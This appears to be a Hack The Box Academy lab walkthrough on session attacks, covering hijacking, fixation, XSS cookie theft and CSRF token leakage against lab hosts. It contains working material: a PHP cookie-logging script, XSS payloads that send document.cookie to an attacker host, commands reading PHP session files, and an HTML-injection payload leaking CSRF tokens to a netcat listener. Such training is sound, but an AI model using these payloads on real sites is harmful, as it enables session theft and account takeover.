A session identifier's security level depends on its:

- `Validity Scope` (a secure session identifier should be valid for one session only)
- `Randomness` (a secure session identifier should be generated through a robust random number/string generation algorithm so that it cannot be predicted)
- `Validity Time` (a secure session identifier should expire after a certain amount of time)

## Session Hijacking
In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.

An attacker can obtain a victim's session identifier using several methods, with the most common being:

- Passive Traffic Sniffing
- Cross-Site Scripting (XSS)
- Browser history or log-diving
- Read access to a database containing session information

As mentioned in the previous section, if a session identifier's security level is low, an attacker may also be able to brute force it or even predict it.

**Part 1: Identify the session identifier** : Navigate to `http://xss.htb.net` and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

This is an account that we created to look into the application!

You should now be logged in as "Julie Rogers."

Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the application is using a cookie named `auth-session` most probably as a session identifier. Double click this cookie's value and copy it!

**Part 2: Simulate an attacker** : Now, suppose that you are the attacker and you somehow got access to the `auth-session` cookie's value for the user "Julie Rogers".

Open a `New Private Window` and navigate to `http://xss.htb.net` again. Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), replace the current `auth-session` cookie's value with the one you copied in Part 1. Reload the current page, and you will notice that you are logged in as "Julie Rogers" without using any credentials!


## Session Fixation
**Stage 1: Attacker manages to obtain a valid session identifier**

Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. This also means that an attacker can be assigned a valid session identifier without having to authenticate.

**Note**: An attacker can also obtain a valid session identifier by creating an account on the targeted application (if this is a possibility).

**Stage 2: Attacker manages to fixate a valid session identifier**

The above is expected behavior, but it can turn into a session fixation vulnerability if:

- The assigned session identifier pre-login remains the same post-login `and`
- Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a session identifier, then the attacker can fixate a session.

**Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier**

All the attacker has to do is craft a URL and lure the victim into visiting it. If the victim does so, the web application will then assign this session identifier to the victim.

## PHP
Let us look at where PHP session identifiers are usually stored.

The entry `session.save_path` in `PHP.ini` specifies where session data will be stored.

  Obtaining Session Identifiers without User Interaction

```shell-session
ShibuShivansh@htb[/htb]$ locate php.ini
ShibuShivansh@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
ShibuShivansh@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
ShibuShivansh@htb[/htb]$ ls /var/lib/php/sessions
ShibuShivansh@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm

```

### Java

Now, let us look at where Java session identifiers are stored.

According to the Apache Software Foundation:

"The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of `Manager`. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."

You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).

### .NET

Finally, let us look at where .NET session identifiers are stored.

Session data can be found in:

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server

Please refer to the following resource for more in-depth details: [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

## XSS
In this module, we'll be using some basic XSS Payloads to trigger functionalities in the Website like : 
```
"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)>
```

Check these payloads by entering into the field directly, and if they get triggered, check within the Developer Tools, that if HTTPOnly if "off" or not.

## Obtaining session cookies through XSS

We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.

Let us create a cookie-logging script (save it as `log.php`) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).

Code: php

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.

The cookie-logging script can be run as follows. `TUN Adapter IP` is the `tun` interface's IP of either Pwnbox or your own VM.

  Cross-Site Scripting (XSS)

```shell-session
ShibuShivansh@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the _Country_ field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.

Payload:

Code: javascript

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

**Note**: If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:

Code: javascript

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

**Simulate the victim**

Open a `New Private Window`, navigate to `http://xss.htb.net` and log in to the application using the credentials below:

- Email: smallfrog576
- Password: guitars

This account will play the role of the victim!

Now, navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).

You should now see the below in your attacking machine.

![Terminal output showing PHP server started on 10.10.14.36:8000, with a GET request to /log.php containing an auth-session parameter.](https://academy.hackthebox.com/storage/modules/153/52.png)

Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside `cookieLog.txt`

![Terminal output showing contents of cookieLog.txt with an auth-session value.](https://academy.hackthebox.com/storage/modules/153/53.png)

You can now use this stolen cookie to hijack the victim's session!


# Cross-Site Request Forgery (POST-based)

---

The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`csrf.htb.net`) to access the application.

Navigate to `http://csrf.htb.net` and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

This is an account that we created to look at the application's functionality.

After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`

![Confirmation prompt to delete account with email julie.rogers@example.com.](https://academy.hackthebox.com/storage/modules/153/36.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:

Code: html

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

![Confirmation prompt to delete account with email h1underline.](https://academy.hackthebox.com/storage/modules/153/37.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

![HTML source code showing an underlined heading and hidden CSRF input.](https://academy.hackthebox.com/storage/modules/153/39.png)

Let us first instruct Netcat to listen on port 8000, as follows.

  Cross-Site Request Forgery (POST-based)

```shell-session
ShibuShivansh@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.

Code: html

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

![Terminal output showing netcat listening on port 8000, receiving a GET request with a hidden CSRF token.](https://academy.hackthebox.com/storage/modules/153/40.png)

Since the attack was successful against our test account, we can do the same against any account of our choosing.

We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

Next, we will cover how you can chain XSS and CSRF to attack a user's session.

